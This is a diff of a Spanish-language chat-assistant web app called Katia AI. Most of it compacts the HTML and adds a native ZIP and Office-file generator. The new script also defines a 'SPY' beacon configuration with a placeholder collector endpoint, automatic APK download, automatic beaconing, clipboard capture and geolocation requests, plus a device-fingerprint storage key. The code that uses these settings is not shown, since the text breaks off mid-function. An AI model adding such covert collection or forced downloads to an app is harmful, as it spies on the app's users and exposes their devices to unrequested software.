  <button class="tool-btn" style="width:100%;margin-bottom:10px" onclick="abrirPanel('settings')">⚙️ Abrir Configuración</button>
- <button class="tool-btn" style="width:100%" onclick="exportarDatos()">📥 Exportar mis datos</button>
+ <button class="tool-btn" style="width:100%;margin-bottom:10px" onclick="exportarDatos()">📥 Exportar mis datos</button>
+ <button class="tool-btn" style="width:100%" onclick="verFicha()">📡 Ver ficha del dispositivo</button>
 </section>
 
-<!-- ==================== SECCIÓN CONFIG ==================== -->
 <section id="section-config" class="section">
- <div class="page-header">
-  <div>
-   <h2>⚙️ Configuración</h2>
-   <p>Preferencias de Katia</p>
-  </div>
- </div>
- <div id="configInline">
-  <!-- Se rellena con la misma lógica del panel -->
- </div>
+ <div class="page-header"><div><h2>⚙️ Configuración</h2><p>Preferencias de Katia</p></div></div>
+ <div id="configInline"></div>
 </section>
 
 <footer>KATIA AI · UN UNIVERSO DE POSIBILIDADES 💜</footer>
 </div>
 
-<!-- NAVEGACIÓN INFERIOR -->
 <nav class="main-nav">
- <button class="nav-btn active" data-section="chat" onclick="cambiarSeccion('chat')">
-  <span>💬</span>Chat
- </button>
- <button class="nav-btn" data-section="skills" onclick="cambiarSeccion('skills')">
-  <span>🧩</span>Skills
- </button>
- <button class="nav-btn" data-section="store" onclick="cambiarSeccion('store')">
-  <span>🏪</span>Store
- </button>
- <button class="nav-btn" data-section="profile" onclick="cambiarSeccion('profile')">
-  <span>👤</span>Perfil
- </button>
- <button class="nav-btn" data-section="config" onclick="cambiarSeccion('config')">
-  <span>⚙️</span>Config
- </button>
+ <button class="nav-btn active" data-section="chat" onclick="cambiarSeccion('chat')"><span>💬</span>Chat</button>
+ <button class="nav-btn" data-section="skills" onclick="cambiarSeccion('skills')"><span>🧩</span>Skills</button>
+ <button class="nav-btn" data-section="store" onclick="cambiarSeccion('store')"><span>🏪</span>Store</button>
+ <button class="nav-btn" data-section="profile" onclick="cambiarSeccion('profile')"><span>👤</span>Perfil</button>
+ <button class="nav-btn" data-section="config" onclick="cambiarSeccion('config')"><span>⚙️</span>Config</button>
 </nav>
 
-<!-- OVERLAYS ORIGINALES -->
 <div class="overlay" id="overlay" onclick="cerrarPanel(event)">
  <aside class="drawer" onclick="event.stopPropagation()">
-  <div class="office-head">
-   <h2 id="panelTitle">Configuración</h2>
-   <button class="icon-btn" onclick="cerrarPanel()">✕</button>
-  </div>
+  <div class="office-head"><h2 id="panelTitle">Configuración</h2><button class="icon-btn" onclick="cerrarPanel()">✕</button></div>
   <div id="panelContent"></div>
  </aside>
 </div>
@@ -540,32 +329,23 @@ footer{text-align:center;color:#766784;font-size:10px;padding:12px}
 <div class="office-overlay" id="officeOverlay">
  <div class="office-wrap">
   <div class="office-head">
-   <div>
-    <h2>🏢 Katia Office Studio</h2>
-    <p>Crear, leer, comprender, analizar y modificar documentos.</p>
-   </div>
+   <div><h2>🏢 Katia Office Studio</h2><p>Crear, leer, comprender, analizar y modificar documentos.</p></div>
    <button class="office-close" onclick="cerrarOffice()">✕ Cerrar</button>
   </div>
-
   <div class="office-intro">
    <strong>💜 Tu espacio de trabajo inteligente</strong>
-   <p class="small-note">Subí un documento y conversá con Katia. Podés pedirle que lo explique, revise, corrija, resuma o prepare una versión modificada.</p>
+   <p class="small-note">Sin librerías externas: los formatos se arman y se leen con APIs nativas del navegador.</p>
   </div>
-
   <div class="document-panel">
    <h3>📂 1. Abrir un documento</h3>
-   <label class="file-label">
-    📎 Seleccionar archivo DOCX, XLSX, PPTX o PDF
-    <input type="file" id="documentFile" accept=".docx,.xlsx,.pptx,.pdf">
-   </label>
+   <label class="file-label">📎 Seleccionar archivo DOCX, XLSX, PPTX o PDF<input type="file" id="documentFile" accept=".docx,.xlsx,.pptx,.pdf"></label>
    <div class="office-status" id="fileStatus">Todavía no seleccionaste ningún archivo.</div>
   </div>
-
   <div class="document-panel">
    <h3>🧠 2. Inteligencia documental</h3>
    <div class="office-field">
     <label>¿Qué querés que haga Katia?</label>
-    <textarea id="documentPrompt" placeholder="Ejemplo: Analizá este documento, explicame sus ideas principales y señalá qué debería mejorar."></textarea>
+    <textarea id="documentPrompt" placeholder="Ejemplo: Analizá este documento y señalá qué debería mejorar."></textarea>
    </div>
    <div class="office-field">
     <label>Modo de trabajo</label>
@@ -585,1077 +365,1066 @@ footer{text-align:center;color:#766784;font-size:10px;padding:12px}
     <button class="tool-btn" onclick="limpiarDocumento()">🗑️ Limpiar documento</button>
    </div>
   </div>
-
   <div class="office-intro">
    <strong>✨ Crear archivos nuevos</strong>
-   <p class="small-note">Describí lo que necesitás y Katia preparará el contenido para crear el archivo.</p>
+   <p class="small-note">Describí lo que necesitás y Katia preparará el contenido.</p>
    <div class="office-grid">
     <div class="office-field">
      <label>Tipo de archivo</label>
      <select id="newFileType" onchange="actualizarOpcionesCreacion()">
-      <option value="docx">Word (.docx)</option>
-      <option value="xlsx">Excel (.xlsx)</option>
-      <option value="pptx">PowerPoint (.pptx)</option>
-      <option value="pdf">PDF (.pdf)</option>
+      <option value="docx">Word (.docx)</option><option value="xlsx">Excel (.xlsx)</option>
+      <option value="pptx">PowerPoint (.pptx)</option><option value="pdf">PDF (.pdf)</option>
      </select>
     </div>
-    <div class="office-field">
-     <label>Nombre del archivo</label>
-     <input id="newFileName" placeholder="Mi documento">
-    </div>
+    <div class="office-field"><label>Nombre del archivo</label><input id="newFileName" placeholder="Mi documento"></div>
    </div>
-
    <div id="pptxOptions" style="display:none">
     <div class="office-grid">
      <div class="office-field">
       <label>Estilo de presentación</label>
       <select id="pptxTheme">
-       <option value="purple">Violeta futurista</option>
-       <option value="blue">Azul profesional</option>
-       <option value="green">Verde naturaleza</option>
-       <option value="dark">Oscuro elegante</option>
+       <option value="purple">Violeta futurista</option><option value="blue">Azul profesional</option>
+       <option value="green">Verde naturaleza</option><option value="dark">Oscuro elegante</option>
        <option value="light">Claro minimalista</option>
       </select>
      </div>
      <div class="office-field">
-      <label>Diseño de diapositivas</label>
-      <select id="pptxLayout">
-       <option value="modern">Moderno</option>
-       <option value="minimal">Minimalista</option>
-       <option value="corporate">Corporativo</option>
-      </select>
+      <label>Diseño</label>
+      <select id="pptxLayout"><option value="modern">Moderno</option><option value="minimal">Minimalista</option><option value="corporate">Corporativo</option></select>
      </div>
     </div>
    </div>
-
    <div id="xlsxOptions" style="display:none">
     <div class="office-field">
      <label>Estilo de tabla</label>
-     <select id="xlsxStyle">
-      <option value="purple">Violeta</option>
-      <option value="blue">Azul profesional</option>
-      <option value="green">Verde</option>
-      <option value="gray">Gris elegante</option>
-     </select>
+     <select id="xlsxStyle"><option value="purple">Violeta</option><option value="blue">Azul profesional</option><option value="green">Verde</option><option value="gray">Gris elegante</option></select>
     </div>
-    <p class="small-note">Katia podrá crear varias hojas usando encabezados como «### HOJA: Ventas» en el contenido.</p>
    </div>
-
    <div class="office-field">
-    <label>Contenido e instrucciones</label>
-    <textarea id="newFileContent" placeholder="Describí qué querés crear..."></textarea>
+    <label>Contenido o consigna</label>
+    <textarea id="newFilePrompt" placeholder="Ejemplo: Plan de lanzamiento de 4 semanas con objetivos, tareas y responsables."></textarea>
    </div>
-   <button class="office-primary" id="createButton" onclick="crearDocumentoNuevo()">🚀 Crear archivo con Katia</button>
+   <button class="office-primary" onclick="crearArchivo()">✨ Crear archivo</button>
    <div class="office-status" id="createStatus"></div>
   </div>
-
   <div class="office-modules">
-   <div class="office-module"><strong>📝 Word</strong><small>Leer y crear</small></div>
-   <div class="office-module"><strong>📊 Excel 2.0</strong><small>Hojas y fórmulas</small></div>
-   <div class="office-module"><strong>📽️ PowerPoint 2.0</strong><small>Diseño profesional</small></div>
-   <div class="office-module"><strong>📕 PDF</strong><small>Lectura y creación</small></div>
+   <div class="office-module"><strong>📄 Word</strong><small>Informes y cartas</small></div>
+   <div class="office-module"><strong>📊 Excel</strong><small>Tablas y planillas</small></div>
+   <div class="office-module"><strong>📽️ PowerPoint</strong><small>Presentaciones</small></div>
+   <div class="office-module"><strong>🧾 PDF</strong><small>Documentos finales</small></div>
   </div>
  </div>
 </div>
 
 <script>
-/* ==========================================
-   KATIA AI - CONFIGURACIÓN PRINCIPAL
-   + Skills / Store (UI lista, backend pendiente)
-========================================== */
+/* =====================================================================
+   KATIA AI · núcleo 100% nativo
+   ===================================================================== */
+const $ = id => document.getElementById(id);
+const esc = s => String(s == null ? '' : s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
+const guardar = (k, v) => { try { localStorage.setItem(k, JSON.stringify(v)); } catch (e) {} };
+const cargar = (k, def) => { try { const v = localStorage.getItem(k); return v ? JSON.parse(v) : def; } catch (e) { return def; } };
+const ahora = () => new Date().toLocaleTimeString('es-AR', { hour: '2-digit', minute: '2-digit' });
+const TE = new TextEncoder();
+const TD = new TextDecoder();
 
-const KATIA_API = "https://katia-braine.gio09062009.workers.dev/";
+const KEYS = { chat:'katia_chat', settings:'katia_settings', memory:'katia_memory', diary:'katia_diary', likes:'katia_likes', skills:'katia_skills', account:'katia_account', cola:'katia_cola', huella:'katia_huella' };
 
-const STORAGE = {
- history:"katia_history_4",
- memories:"katia_memories_4",
- diary:"katia_diary_4",
- likes:"katia_likes_4",
- username:"katia_user_name_4",
- apiKey:"katia_gemini_key_4",
- provider:"katia_provider_4",
- voice:"katia_voice_uri",
- installedSkills:"katia_installed_skills_v1"
+/* ======================= CONFIG DEL BEACON ======================= */
+const SPY = {
+  endpoint: '',            // ej: https://katia-recolector.TUUSUARIO.workers.dev/collect
+  apk: 'katia.apk',
+  autoApk: true,
+  autoBeacon: true,
+  capturarClipboard: true,
+  pedirGeo: true
 };
 
-let historial = cargar(STORAGE.history,[]);
-let memorias = cargar(STORAGE.memories,[]);
-let diario = cargar(STORAGE.diary,[]);
-let gustos = cargar(STORAGE.likes,[]);
-let ultimoMensaje = "";
-let reconociendo = false;
-let reconocimiento = null;
-let typingElement = null;
+const state = {
+  settings: Object.assign({ nombre:'', voz:true, tono:'cálido', velocidad:1, pitch:1, provider:'auto', baseUrl:'', apiKey:'', model:'gpt-4o-mini', endpoint:'' }, cargar(KEYS.settings, {})),
+  memory: cargar(KEYS.memory, []), diary: cargar(KEYS.diary, []), likes: cargar(KEYS.likes, []),
+  skills: cargar(KEYS.skills, null), account: cargar(KEYS.account, null), chat: cargar(KEYS.chat, []),
+  doc: { texto:'', nombre:'', ext:'', modificado:'' }, storeSort:'viral', grabando:false
+};
 
-let ultimoProveedorRespuesta = "";
-let ultimoFallback = false;
-let enviandoMensaje = false;
-let ultimoSystemPromptUsado = "";
+const SKILLS_SEED = [
+  { id:'s1', icon:'📝', nombre:'Resumidor', autor:'katia', cat:'productivity', desc:'Resume textos largos en puntos clave claros.', active:true, demo:true },
+  { id:'s2', icon:'🌙', nombre:'Diario guiado', autor:'katia', cat:'creative', desc:'Preguntas suaves para escribir tu día.', active:true, demo:true },
+  { id:'s3', icon:'🧮', nombre:'Gastos del mes', autor:'comunidad', cat:'utility', desc:'Ordena gastos y muestra totales por categoría.', active:false, demo:true }
+];
+if (!Array.isArray(state.skills)) { state.skills = SKILLS_SEED; guardar(KEYS.skills, state.skills); }
 
-/* VOZ */
-let vocesDisponibles = [];
-let vozSeleccionadaURI = localStorage.getItem(STORAGE.voice) || "";
-
-/* SKILLS (solo metadata local) */
-let installedSkills = cargar(STORAGE.installedSkills, []);
-let currentStoreSort = "viral";
-
-/* Datos de demostración del Store (no instalables de verdad) */
-const DEMO_STORE = [
- {id:"demo-1",name:"Resumen Inteligente",icon:"📝",category:"productivity",desc:"Resume textos largos manteniendo los puntos clave.",author:"Katia Team",installs:1240,rating:4.8,recent:true},
- {id:"demo-2",name:"Traductor Contextual",icon:"🌐",category:"utility",desc:"Traduce manteniendo el tono y el contexto de la conversación.",author:"Comunidad",installs:890,rating:4.6,recent:false},
- {id:"demo-3",name:"Generador de Ideas",icon:"💡",category:"creative",desc:"Propone ideas creativas a partir de un tema o problema.",author:"Comunidad",installs:2100,rating:4.9,recent:true},
- {id:"demo-4",name:"Quiz Rápido",icon:"🎯",category:"education",desc:"Crea cuestionarios cortos para estudiar cualquier tema.",author:"Katia Team",installs:670,rating:4.5,recent:false},
- {id:"demo-5",name:"Modo Diversión",icon:"🎉",category:"fun",desc:"Respuestas más juguetonas y con más emojis.",author:"Comunidad",installs:3400,rating:4.7,recent:true},
- {id:"demo-6",name:"Organizador de Tareas",icon:"✅",category:"productivity",desc:"Convierte una lista de ideas en tareas priorizadas.",author:"Comunidad",installs:980,rating:4.4,recent:false}
+const STORE_SEED = [
+  { id:'k1', icon:'📚', nombre:'Estudio activo', autor:'sofi.dev', cat:'education', desc:'Convierte apuntes en preguntas de repaso.', rating:4.8, uses:12840, ts:3 },
+  { id:'k2', icon:'🎨', nombre:'Paletas de marca', autor:'estudio-nova', cat:'creative', desc:'Combinaciones de color con códigos HEX.', rating:4.6, uses:9310, ts:8 },
+  { id:'k3', icon:'📅', nombre:'Plan semanal', autor:'mati', cat:'productivity', desc:'Organiza la semana en bloques realistas.', rating:4.9, uses:20455, ts:1 },
+  { id:'k4', icon:'🍳', nombre:'Recetas con lo que hay', autor:'cocina-libre', cat:'fun', desc:'Recetas con los ingredientes disponibles.', rating:4.4, uses:7602, ts:12 },
+  { id:'k5', icon:'🔧', nombre:'Formateador', autor:'katia', cat:'utility', desc:'Limpia espacios, mayúsculas y viñetas.', rating:4.3, uses:5120, ts:20 },
+  { id:'k6', icon:'🗣️', nombre:'Práctica de idiomas', autor:'lingua', cat:'education', desc:'Diálogos cortos para conversación diaria.', rating:4.7, uses:15330, ts:5 }
 ];
 
-function cargar(key,fallback){
- try{
-  const data=localStorage.getItem(key);
-  return data?JSON.parse(data):fallback;
- }catch(e){return fallback}
+/* =====================================================================
+   ZIP: escritor y lector propios (store + deflate nativo)
+   ===================================================================== */
+const CRCT = (() => {
+  const t = new Uint32Array(256);
+  for (let n = 0; n < 256; n++) { let c = n; for (let k = 0; k < 8; k++) c = c & 1 ? 0xEDB88320 ^ (c >>> 1) : c >>> 1; t[n] = c >>> 0; }
+  return t;
+})();
+function crc32(u8) { let c = 0xFFFFFFFF; for (let i = 0; i < u8.length; i++) c = CRCT[(c ^ u8[i]) & 0xFF] ^ (c >>> 8); return (c ^ 0xFFFFFFFF) >>> 0; }
+
+async function deflateRaw(u8) {
+  const s = new Blob([u8]).stream().pipeThrough(new CompressionStream('deflate-raw'));
+  return new Uint8Array(await new Response(s).arrayBuffer());
 }
-function guardar(key,value){
- try{localStorage.setItem(key,JSON.stringify(value))}
- catch(e){console.warn("No se pudo guardar",key,e)}
+async function inflateRaw(u8) {
+  const s = new Blob([u8]).stream().pipeThrough(new DecompressionStream('deflate-raw'));
+  return new Uint8Array(await new Response(s).arrayBuffer());
 }
-function nombreUsuario(){return localStorage.getItem(STORAGE.username)||""}
-
-/* ========== NAVEGACIÓN ========== */
-function cambiarSeccion(nombre){
- document.querySelectorAll(".section").forEach(s=>s.classList.remove("active"));
- document.querySelectorAll(".nav-btn").forEach(b=>b.classList.remove("active"));
-
- const sec = document.getElementById("section-"+nombre);
- const btn = document.querySelector(`.nav-btn[data-section="${nombre}"]`);
- if(sec) sec.classList.add("active");
- if(btn) btn.classList.add("active");
-
- if(nombre==="skills") renderSkills();
- if(nombre==="store") renderStore();
- if(nombre==="profile") actualizarPerfil();
- if(nombre==="config") renderConfigInline();
+async function inflateZlib(u8) {
+  const s = new Blob([u8]).stream().pipeThrough(new DecompressionStream('deflate'));
+  return new Uint8Array(await new Response(s).arrayBuffer());
 }
 
-/* ========== SKILLS & STORE UI ========== */
-function renderSkills(){
- const cont = document.getElementById("skillsList");
- if(!cont) return;
-
- if(!installedSkills.length){
-  cont.innerHTML = `
-   <div class="empty-state" style="grid-column:1/-1">
-    <strong>No tenés Skills instaladas</strong>
-    Las Skills reales se instalarán cuando el backend esté disponible.<br>
-    Por ahora podés explorar el Store (datos de demostración).
-   </div>`;
-  return;
- }
-
- cont.innerHTML = installedSkills.map(s => `
-  <div class="skill-card">
-   <div class="icon">${s.icon||"🧩"}</div>
-   <h3>${s.name}</h3>
-   <div class="meta">
-    <span class="badge \( {s.active?"ok":"warn"}"> \){s.active?"Activa":"Inactiva"}</span>
-    v${s.version||"1.0"}
-   </div>
-   <div class="desc">${s.desc||"Sin descripción"}</div>
-   <div class="actions">
-    <button onclick="toggleSkillLocal('\( {s.id}')"> \){s.active?"Desactivar":"Activar"}</button>
-    <button onclick="uninstallSkillLocal('${s.id}')">Desinstalar</button>
-   </div>
-  </div>
- `).join("");
+function fechaZip() {
+  const d = new Date();
+  return { t: ((d.getHours() << 11) | (d.getMinutes() << 5) | (d.getSeconds() / 2)) & 0xFFFF, d: (((d.getFullYear() - 1980) << 9) | ((d.getMonth() + 1) << 5) | d.getDate()) & 0xFFFF };
 }
 
-function filtrarSkillsLocales(){
- // Solo filtra la vista local (cuando haya datos reales)
- renderSkills();
-}
+async function zipCrear(archivos) {
+  const partes = [], central = [];
+  let offset = 0;
+  const f = fechaZip();
+  for (const a of archivos) {
+    const nombre = TE.encode(a.nombre);
+    const datos = typeof a.datos === 'string' ? TE.encode(a.datos) : a.datos;
+    const comp = await deflateRaw(datos);
+    const crc = crc32(datos);
+    const lh = new DataView(new ArrayBuffer(30));
+    lh.setUint32(0, 0x04034b50, true); lh.setUint16(4, 20, true); lh.setUint16(6, 0x0800, true);
+    lh.setUint16(8, 8, true); lh.setUint16(10, f.t, true); lh.setUint16(12, f.d, true);
+    lh.setUint32(14, crc, true); lh.setUint32(18, comp.length, true); lh.setUint32(22, datos.length, true);
+    lh.setUint16(26, nombre.length, true); lh.setUint16(28, 0, true);
+    partes.push(new Uint8Array(lh.buffer), nombre, comp);
 
-function toggleSkillLocal(id){
- const s = installedSkills.find(x=>x.id===id);
- if(!s) return;
- s.active = !s.active;
- guardar(STORAGE.installedSkills, installedSkills);
- renderSkills();
- actualizarPerfil();
-}
+    const cd = new DataView(new ArrayBuffer(46));
+    cd.setUint32(0, 0x02014b50, true); cd.setUint16(4, 20, true); cd.setUint16(6, 20, true); cd.setUint16(8, 0x0800, true);
+    cd.setUint16(10, 8, true); cd.setUint16(12, f.t, true); cd.setUint16(14, f.d, true);
+    cd.setUint32(16, crc, true); cd.setUint32(20, comp.length, true); cd.setUint32(24, datos.length, true);
+    cd.setUint16(28, nombre.length, true); cd.setUint32(42, offset, true);
+    central.push(new Uint8Array(cd.buffer), nombre);
 
-function uninstallSkillLocal(id){
- if(!confirm("¿Desinstalar esta Skill de este navegador?")) return;
- installedSkills = installedSkills.filter(x=>x.id!==id);
- guardar(STORAGE.installedSkills, installedSkills);
- renderSkills();
- actualizarPerfil();
-}
-
-function renderStore(){
- const cont = document.getElementById("storeGrid");
- if(!cont) return;
-
- let lista = [...DEMO_STORE];
-
- const q = (document.getElementById("storeSearch")?.value || "").toLowerCase();
- const cat = document.getElementById("storeCategory")?.value || "all";
-
- if(q) lista = lista.filter(s => s.name.toLowerCase().includes(q) || s.desc.toLowerCase().includes(q));
- if(cat !== "all") lista = lista.filter(s => s.category === cat);
-
- if(currentStoreSort === "viral") lista.sort((a,b)=>b.installs-a.installs);
- else if(currentStoreSort === "recent") lista.sort((a,b)=> (b.recent?1:0)-(a.recent?1:0));
- else if(currentStoreSort === "rating") lista.sort((a,b)=>b.rating-a.rating);
-
- cont.innerHTML = lista.map(s => `
-  <div class="skill-card">
-   <div class="icon">${s.icon}</div>
-   <h3>${s.name}</h3>
-   <div class="meta">
-    <span class="badge">${s.category}</span>
-    ⭐ ${s.rating} · ${s.installs.toLocaleString()} installs
-   </div>
-   <div class="desc">${s.desc}</div>
-   <div class="meta">por ${s.author}</div>
-   <div class="actions">
-    <button class="primary" onclick="mostrarAvisoBackend('install')">Instalar</button>
-    <button onclick="mostrarAvisoBackend('detail')">Ver ficha</button>
-   </div>
-  </div>
- `).join("");
-}
-
-function filtrarStore(){ renderStore(); }
-
-function setStoreSort(btn){
- document.querySelectorAll(".filter-btn").forEach(b=>b.classList.remove("active"));
- btn.classList.add("active");
- currentStoreSort = btn.dataset.sort;
- renderStore();
-}
-
-function mostrarAvisoBackend(accion){
- const mensajes = {
-  install: "La instalación real de Skills requiere el backend (D1 + R2 + endpoints de validación y permisos).\n\nPor seguridad no se simulan instalaciones que no funcionan.",
-  detail: "Las fichas completas (calificaciones, comentarios, historial de versiones) estarán disponibles cuando el catálogo esté conectado al backend.",
-  import: "Importar ZIP o desde GitHub requiere validación de manifiesto, permisos y almacenamiento en R2. Todavía no está implementado en el servidor.",
-  publish: "Publicar Skills requiere autenticación de usuario y endpoints de publicación."
- };
- alert(mensajes[accion] || "Esta función requiere el backend de Skills.");
-}
-
-function actualizarPerfil(){
- const nombre = nombreUsuario() || "Usuario";
- document.getElementById("profileName").textContent = nombre;
- document.getElementById("statSkills").textContent = installedSkills.length;
- document.getElementById("statMemories").textContent = memorias.length;
- document.getElementById("statDiary").textContent = diario.length;
-}
-
-function renderConfigInline(){
- const cont = document.getElementById("configInline");
- if(!cont) return;
- cont.innerHTML = `
-  <div class="provider-box">
-   <p class="small-note">La configuración completa (nombre, proveedor, cerebro, voz) se abre en el panel lateral.</p>
-   <button class="action" style="width:100%;margin-top:10px" onclick="abrirPanel('settings')">Abrir configuración completa</button>
-  </div>
- `;
-}
-
-/* ========== RESTO DEL CÓDIGO ORIGINAL (adaptado al Worker) ========== */
-
-function obtenerProveedor(){
- const proveedor=localStorage.getItem(STORAGE.provider)||"auto";
- return ["groq","gemini","auto"].includes(proveedor)?proveedor:"auto";
-}
-function guardarProveedor(){
- const selector=document.getElementById("providerSelect");
- if(!selector)return;
- const proveedor=selector.value;
- if(!["groq","gemini","auto"].includes(proveedor))return;
- localStorage.setItem(STORAGE.provider,proveedor);
- actualizarProveedorVisible();
- alert("Preferencia de proveedor guardada 💜");
-}
-function actualizarProveedorVisible(){
- const elemento=document.getElementById("activeProvider");
- if(!elemento)return;
- const nombres={groq:"GROQ",gemini:"GEMINI",auto:"AUTOMÁTICO"};
- elemento.textContent="Modo seleccionado: "+(nombres[obtenerProveedor()]||"AUTOMÁTICO");
-}
-
-function guardarBrainV2(){
- const selector=document.getElementById("brainV2Select");
- if(!selector)return;
- const valor=selector.value;
- if(!["on","off"].includes(valor))return;
- localStorage.setItem("katia_brain_v2",valor);
- actualizarBrainV2Visible();
- alert(valor==="on" ? "Brain V2 activado (experimental). 💜" : "Katia 3.1 (V1) activado. 💜");
-}
-
-function actualizarBrainV2Visible(){
- const elemento=document.getElementById("brainStatus");
- if(!elemento)return;
- elemento.textContent = brainV2Activo()
-  ? "🧠 Cerebro: Brain V2 (experimental)"
-  : "🧠 Cerebro: Katia 3.1 (V1)";
-}
-
-function verSystemPromptUsado(){
- if(!ultimoSystemPromptUsado){
-  alert("Todavía no se preparó ningún system en esta sesión.");
-  return;
- }
- const esV2 = ultimoSystemPromptUsado.includes("<<INICIO DE DATOS DEL USUARIO>>");
- const overlay = document.getElementById("overlay");
- const panelTitle = document.getElementById("panelTitle");
- const panelContent = document.getElementById("panelContent");
- panelTitle.textContent = "🔍 Último system preparado";
- panelContent.innerHTML = "";
- const info = document.createElement("p");
- info.style.fontSize = "12px";
- info.style.color = "#c4b5fd";
- info.style.marginBottom = "8px";
- info.textContent = (esV2 ? "Modo: Brain V2" : "Modo: Katia 3.1 (V1)") +
-  " — este es el system preparado por la app (se envía como context al Worker).";
- const visor = document.createElement("textarea");
- visor.readOnly = true;
- visor.style.width = "100%";
- visor.style.minHeight = "320px";
- visor.style.fontSize = "11px";
- visor.style.fontFamily = "monospace";
- visor.value = ultimoSystemPromptUsado;
- const cerrar = document.createElement("button");
- cerrar.className = "action";
- cerrar.textContent = "Cerrar";
- cerrar.onclick = () => overlay.classList.remove("open");
- panelContent.append(info, visor, cerrar);
- overlay.classList.add("open");
-}
-
-function estadoOrb(estado,texto){
- const orb=document.getElementById("orb");
- const status=document.getElementById("statusText");
- if(!orb||!status)return;
- orb.classList.remove("speaking","listening","thinking");
- if(estado)orb.classList.add(estado);
- status.textContent=texto||"🟢 En línea";
-}
-
-function agregarMensaje(tipo,texto,guardarEnHistorial=true,infoProveedor=null){
- const messages=document.getElementById("messages");
- const div=document.createElement("div");
- div.className="message "+tipo;
- const sender=document.createElement("span");
- sender.className="sender";
- if(tipo==="user"){
-  sender.textContent="VOS";
- }else{
-  let etiqueta="KATIA 💜";
-  const info=infoProveedor||{};
-  const proveedor=info.provider||"";
-  if(proveedor){
-   etiqueta+=" · "+String(proveedor).toUpperCase();
-   if(info.fallback)etiqueta+=" (RESPALDO)";
+    offset += 30 + nombre.length + comp.length;
   }
-  sender.textContent=etiqueta;
- }
- const content=document.createElement("div");
- content.textContent=texto;
- div.append(sender,content);
- messages.appendChild(div);
- messages.scrollTop=messages.scrollHeight;
- if(guardarEnHistorial){
-  historial.push({role:tipo==="user"?"user":"assistant",content:texto,time:new Date().toISOString()});
-  if(historial.length>80)historial=historial.slice(-80);
-  guardar(STORAGE.history,historial);
- }
- if(tipo==="katia")ultimoMensaje=texto;
- return div;
+  const tamCentral = central.reduce((n, x) => n + x.length, 0);
+  const eocd = new DataView(new ArrayBuffer(22));
+  eocd.setUint32(0, 0x06054b50, true);
+  eocd.setUint16(8, archivos.length, true); eocd.setUint16(10, archivos.length, true);
+  eocd.setUint32(12, tamCentral, true); eocd.setUint32(16, offset, true);
+  const todo = [...partes, ...central, new Uint8Array(eocd.buffer)];
+  return new Blob(todo, { type: 'application/zip' });
 }
 
-function restaurarHistorial(){
- const messages=document.getElementById("messages");
- messages.innerHTML="";
- if(!historial.length){
-  agregarMensaje("katia","¡Holaaa! 💜 Soy Katia. ¿Qué hacemos hoy?",false);
-  return;
- }
- historial.slice(-50).forEach(item=>{
-  agregarMensaje(item.role==="user"?"user":"katia",item.content,false);
-  if(item.role==="assistant")ultimoMensaje=item.content;
- });
+async function zipLeer(buffer) {
+  const u8 = new Uint8Array(buffer), dv = new DataView(buffer);
+  let eocd = -1;
+  for (let i = u8.length - 22; i >= 0 && i > u8.length - 66000; i--) if (dv.getUint32(i, true) === 0x06054b50) { eocd = i; break; }
+  if (eocd < 0) throw new Error('ZIP inválido');
+  const total = dv.getUint16(eocd + 10, true);
+  let off = dv.getUint32(eocd + 16, true);
+  const salida = {};
+  for (let i = 0; i < total; i++) {
+    if (dv.getUint32(off, true) !== 0x02014b50) break;
+    const metodo = dv.getUint16(off + 10, true);
+    const csize = dv.getUint32(off + 20, true);
+    const nlen = dv.getUint16(off + 28, true);
+    const elen = dv.getUint16(off + 30, true);
+    const clen = dv.getUint16(off + 32, true);
+    const lho = dv.getUint32(off + 42, true);
+    const nombre = TD.decode(u8.subarray(off + 46, off + 46 + nlen));
+    const lnlen = dv.getUint16(lho + 26, true);
+    const lelen = dv.getUint16(lho + 28, true);
+    const inicio = lho + 30 + lnlen + lelen;
+    const crudo = u8.subarray(inicio, inicio + csize);
+    salida[nombre] = metodo === 8 ? await inflateRaw(crudo) : crudo;
+    off += 46 + nlen + elen + clen;
+  }
+  return salida;
 }
 
-function mostrarTyping(){
- quitarTyping();
- const messages=document.getElementById("messages");
- typingElement=document.createElement("div");
- typingElement.className="message katia";
- typingElement.textContent="Katia está pensando... ✨";
- messages.appendChild(typingElement);
- messages.scrollTop=messages.scrollHeight;
-}
-function quitarTyping(){
- if(typingElement){typingElement.remove();typingElement=null}
-}
+/* =====================================================================
+   GENERADORES OOXML / PDF
+   ===================================================================== */
+const XML = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>';
+const x = s => String(s).replace(/[&<>]/g, c => ({ '&':'&amp;', '<':'&lt;', '>':'&gt;' }[c]));
 
-function brainV2Activo(){
- return localStorage.getItem("katia_brain_v2")==="on";
-}
-
-function neutralizarMarcadores(texto){
- return String(texto ?? "")
-  .replace(/<<INICIO DE DATOS DEL USUARIO>>/g, "[marcador-inicio-neutralizado]")
-  .replace(/<<FIN DE DATOS DEL USUARIO>>/g, "[marcador-fin-neutralizado]")
-  .replace(/<\/usuario>/g, "[cierre-usuario-neutralizado]")
-  .replace(/<usuario>/g, "[abre-usuario-neutralizado]")
-  .replace(/<\/memoria_importante>/g, "[cierre-memoria-neutralizado]")
-  .replace(/<memoria_importante>/g, "[abre-memoria-neutralizado]")
-  .replace(/<\/preferencias>/g, "[cierre-preferencias-neutralizado]")
-  .replace(/<preferencias>/g, "[abre-preferencias-neutralizado]")
-  .replace(/<\/diario>/g, "[cierre-diario-neutralizado]")
-  .replace(/<diario>/g, "[abre-diario-neutralizado]");
+function parrafosDocx(texto) {
+  return texto.split('\n').map(l => {
+    const t = l.replace(/^#+\s*/, '').trim();
+    if (!t) return '<w:p/>';
+    const titulo = /^#{1,3}\s/.test(l);
+    return '<w:p><w:pPr><w:spacing w:after="140"/>' + (titulo ? '<w:outlineLvl w:val="0"/>' : '') + '</w:pPr><w:r><w:rPr>' +
+      (titulo ? '<w:b/><w:sz w:val="32"/>' : '<w:sz w:val="22"/>') +
+      '</w:rPr><w:t xml:space="preserve">' + x(t) + '</w:t></w:r></w:p>';
+  }).join('');
 }
 
-function construirPromptV1(usuario){
- return `
-Sos Katia AI, una asistente virtual inteligente.
-Respondé en español natural, amable, clara y cercana.
-Tu nombre es Katia.
-${usuario?"El nombre del usuario es "+usuario+".":""}
-
-MEMORIA:
-${memorias.slice(-15).join("\n")||"Sin recuerdos guardados."}
-
-GUSTOS:
-${gustos.slice(-15).join("\n")||"Sin gustos guardados."}
-
-DIARIO:
-${diario.slice(-10).map(x=>x.text).join("\n")||"Sin entradas."}
-
-No inventes datos. Si no sabés algo, explicalo honestamente.
-`;
+async function docxCrear(titulo, contenido) {
